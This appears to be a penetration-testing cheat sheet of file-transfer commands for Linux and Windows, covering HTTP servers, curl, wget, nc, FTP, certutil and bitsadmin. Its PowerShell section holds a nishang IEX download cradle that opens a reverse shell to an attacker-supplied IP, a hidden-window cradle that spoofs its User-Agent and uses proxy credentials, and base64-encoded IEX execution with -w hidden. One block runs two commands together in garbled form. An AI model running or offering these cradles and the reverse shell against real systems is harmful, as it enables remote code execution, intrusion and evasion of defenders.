# Tricks to transfer files between boxes
## Hosting files
Python3
```
python3 -m http.server 80
```
python2
```
python2 -m SimpleHTTPServer 80
```

## Linux
#### Grab over http
```
curl http://IP/PORT/linpeas.sh -o mylin.sh; chmod +x mylin
```
```
wget http://IP/PORT/linpeas.sh
```
```

```
#### transfer with nc
Listener
```
nc -lvnp 1337 > file.txt
```
Sender
```
nc -w3 IP PORT < file.txt
```
#### transfer over FTP
Listener
```
python3 -m pyftpdlib -p 21 -u jeenali -P 123
```
Sender/reciever
```
ftp IP

get file

put file
```

## Windows
Certutil
```
certutil -urlcache -split -f http://IP/putty.exe putty.exe
```
Bitsadmin
```
bitsadmin /transfer job https://IP/putty.exe C:\Temp\putty.exe
```
wget
```
wget http://IP/putty.exe -OutFile putty.exe
```
Powershell
nishang
```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP/putty.exe', 'putty.exe')
```
```
Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  
```
```
powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring('http://google.com/') Encoded Web Request echo -n "IEX(New-Object Net.WebClient).downloadString('http://site.com/script.js')" | iconv -t UTF-16LE | base64 -w 0 powershell -w hidden -nop -enc <ENC_COMMAND_DATA>
```
```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://site.com/script.js')" | iconv -t UTF-16LE | base64 -w 0 powershell -w hidden -nop -enc <ENC_COMMAND_DATA>
```
```

```